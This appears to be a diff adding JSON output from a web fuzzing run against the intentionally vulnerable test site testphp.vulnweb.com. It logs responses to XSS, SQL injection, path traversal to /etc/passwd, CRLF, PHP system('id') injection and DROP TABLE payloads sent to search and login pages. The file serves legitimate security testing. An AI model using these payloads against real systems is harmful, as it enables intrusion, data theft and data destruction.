@@ -1,0 +1,236 @@
+[
+  {
+    "id": 1,
+    "url": "http://testphp.vulnweb.com/search.php?test=# payloads.txt",
+    "payload": "# payloads.txt",
+    "status_code": 200,
+    "content_length": 4732,
+    "response_time": 0.372,
+    "timestamp": "2025-04-22T20:41:57.806993"
+  },
+  {
+    "id": 2,
+    "url": "http://testphp.vulnweb.com/search.php?test=<script>alert(1)</script>",
+    "payload": "<script>alert(1)</script>",
+    "status_code": 200,
+    "content_length": 4732,
+    "response_time": 0.839,
+    "timestamp": "2025-04-22T20:41:58.645660"
+  },
+  {
+    "id": 3,
+    "url": "http://testphp.vulnweb.com/search.php?test=../../../../etc/passwd",
+    "payload": "../../../../etc/passwd",
+    "status_code": 200,
+    "content_length": 4732,
+    "response_time": 1.003,
+    "timestamp": "2025-04-22T20:41:59.648929"
+  },
+  {
+    "id": 4,
+    "url": "http://testphp.vulnweb.com/search.php?test=' OR '1'='1",
+    "payload": "' OR '1'='1",
+    "status_code": 200,
+    "content_length": 4732,
+    "response_time": 0.997,
+    "timestamp": "2025-04-22T20:42:00.646012"
+  },
+  {
+    "id": 5,
+    "url": "http://testphp.vulnweb.com/search.php?test=<svg onload=alert(1)>",
+    "payload": "<svg onload=alert(1)>",
+    "status_code": 200,
+    "content_length": 4732,
+    "response_time": 1.013,
+    "timestamp": "2025-04-22T20:42:01.658718"
+  },
+  {
+    "id": 6,
+    "url": "http://testphp.vulnweb.com/search.php?test=\"><img src=x onerror=alert(1)>",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "status_code": 200,
+    "content_length": 4732,
+    "response_time": 0.987,
+    "timestamp": "2025-04-22T20:42:02.645394"
+  },
+  {
+    "id": 7,
+    "url": "http://testphp.vulnweb.com/search.php?test=; DROP TABLE users;",
+    "payload": "; DROP TABLE users;",
+    "status_code": 200,
+    "content_length": 4732,
+    "response_time": 1.0,
+    "timestamp": "2025-04-22T20:42:03.645493"
+  },
+  {
+    "id": 8,
+    "url": "http://testphp.vulnweb.com/search.php?test=%0A%0DContent-Length:0",
+    "payload": "%0A%0DContent-Length:0",
+    "status_code": 200,
+    "content_length": 4732,
+    "response_time": 1.011,
+    "timestamp": "2025-04-22T20:42:04.656284"
+  },
+  {
+    "id": 9,
+    "url": "http://testphp.vulnweb.com/search.php?test=\"><script src=evil.js></script>",
+    "payload": "\"><script src=evil.js></script>",
+    "status_code": 200,
+    "content_length": 4732,
+    "response_time": 0.998,
+    "timestamp": "2025-04-22T20:42:05.654428"
+  },
+  {
+    "id": 10,
+    "url": "http://testphp.vulnweb.com/search.php?test=<?php system('id'); ?>",
+    "payload": "<?php system('id'); ?>",
+    "status_code": 200,
+    "content_length": 2181,
+    "response_time": 1.005,
+    "timestamp": "2025-04-22T20:42:06.659363"
+  },
+  {
+    "id": 11,
+    "url": "http://testphp.vulnweb.com/search.php?test=admin' --",
+    "payload": "admin' --",
+    "status_code": 200,
+    "content_length": 2173,
+    "response_time": 1.001,
+    "timestamp": "2025-04-22T20:42:07.660354"
+  },
+  {
+    "id": 12,
+    "url": "http://testphp.vulnweb.com/search.php?test=<iframe src=\"javascript:alert(1)\">",
+    "payload": "<iframe src=\"javascript:alert(1)\">",
+    "status_code": 200,
+    "content_length": 4732,
+    "response_time": 1.005,
+    "timestamp": "2025-04-22T20:42:08.665391"
+  },
+  {
+    "id": 13,
+    "url": "http://testphp.vulnweb.com/search.php?test=FUZZFUZZFUZZFUZZFUZZ",
+    "payload": "FUZZFUZZFUZZFUZZFUZZ",
+    "status_code": 200,
+    "content_length": 4732,
+    "response_time": 0.992,
+    "timestamp": "2025-04-22T20:42:09.657538"
+  },
+  {
+    "id": 14,
+    "url": "http://testphp.vulnweb.com/login.php?username=# payloads.txt&password=# payloads.txt",
+    "payload": "# payloads.txt",
+    "status_code": 200,
+    "content_length": 5523,
+    "response_time": 0.991,
+    "timestamp": "2025-04-22T20:42:10.648094"
+  },
+  {
+    "id": 15,
+    "url": "http://testphp.vulnweb.com/login.php?username=<script>alert(1)</script>&password=<script>alert(1)</script>",
+    "payload": "<script>alert(1)</script>",
+    "status_code": 200,
+    "content_length": 5523,
+    "response_time": 1.005,
+    "timestamp": "2025-04-22T20:42:11.652794"
+  },
+  {
+    "id": 16,
+    "url": "http://testphp.vulnweb.com/login.php?username=../../../../etc/passwd&password=../../../../etc/passwd",
+    "payload": "../../../../etc/passwd",
+    "status_code": 200,
+    "content_length": 5523,
+    "response_time": 1.017,
+    "timestamp": "2025-04-22T20:42:12.670041"
+  },
+  {
+    "id": 17,
+    "url": "http://testphp.vulnweb.com/login.php?username=' OR '1'='1&password=' OR '1'='1",
+    "payload": "' OR '1'='1",
+    "status_code": 200,
+    "content_length": 5523,
+    "response_time": 0.995,
+    "timestamp": "2025-04-22T20:42:13.665336"
+  },
+  {
+    "id": 18,
+    "url": "http://testphp.vulnweb.com/login.php?username=<svg onload=alert(1)>&password=<svg onload=alert(1)>",
+    "payload": "<svg onload=alert(1)>",
+    "status_code": 200,
+    "content_length": 5523,
+    "response_time": 0.993,
+    "timestamp": "2025-04-22T20:42:14.658321"
+  },
+  {
+    "id": 19,
+    "url": "http://testphp.vulnweb.com/login.php?username=\"><img src=x onerror=alert(1)>&password=\"><img src=x onerror=alert(1)>",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "status_code": 200,
+    "content_length": 5523,
+    "response_time": 1.005,
+    "timestamp": "2025-04-22T20:42:15.662897"
+  },
+  {
+    "id": 20,
+    "url": "http://testphp.vulnweb.com/login.php?username=; DROP TABLE users;&password=; DROP TABLE users;",
+    "payload": "; DROP TABLE users;",
+    "status_code": 200,
+    "content_length": 5523,
+    "response_time": 1.013,
+    "timestamp": "2025-04-22T20:42:16.675775"
+  },
+  {
+    "id": 21,
+    "url": "http://testphp.vulnweb.com/login.php?username=%0A%0DContent-Length:0&password=%0A%0DContent-Length:0",
+    "payload": "%0A%0DContent-Length:0",
+    "status_code": 200,
+    "content_length": 5523,
+    "response_time": 0.985,
+    "timestamp": "2025-04-22T20:42:17.660955"
+  },
+  {
+    "id": 22,
+    "url": "http://testphp.vulnweb.com/login.php?username=\"><script src=evil.js></script>&password=\"><script src=evil.js></script>",
+    "payload": "\"><script src=evil.js></script>",
+    "status_code": 200,
+    "content_length": 5523,
+    "response_time": 1.024,
+    "timestamp": "2025-04-22T20:42:18.684561"
+  },
+  {
+    "id": 23,
+    "url": "http://testphp.vulnweb.com/login.php?username=<?php system('id'); ?>&password=<?php system('id'); ?>",
+    "payload": "<?php system('id'); ?>",
+    "status_code": 200,
+    "content_length": 5523,
+    "response_time": 0.984,
+    "timestamp": "2025-04-22T20:42:19.668729"
+  },
+  {
+    "id": 24,
+    "url": "http://testphp.vulnweb.com/login.php?username=admin' --&password=admin' --",
+    "payload": "admin' --",
+    "status_code": 200,
+    "content_length": 5523,
+    "response_time": 1.012,
+    "timestamp": "2025-04-22T20:42:20.680289"
+  },
+  {
+    "id": 25,
+    "url": "http://testphp.vulnweb.com/login.php?username=<iframe src=\"javascript:alert(1)\">&password=<iframe src=\"javascript:alert(1)\">",
+    "payload": "<iframe src=\"javascript:alert(1)\">",
+    "status_code": 200,
+    "content_length": 5523,
+    "response_time": 0.99,
+    "timestamp": "2025-04-22T20:42:21.670795"
+  },
+  {
+    "id": 26,
+    "url": "http://testphp.vulnweb.com/login.php?username=FUZZFUZZFUZZFUZZFUZZ&password=FUZZFUZZFUZZFUZZFUZZ",
+    "payload": "FUZZFUZZFUZZFUZZFUZZ",
+    "status_code": 200,
+    "content_length": 5523,
+    "response_time": 0.996,
+    "timestamp": "2025-04-22T20:42:22.666340"
+  }
+]
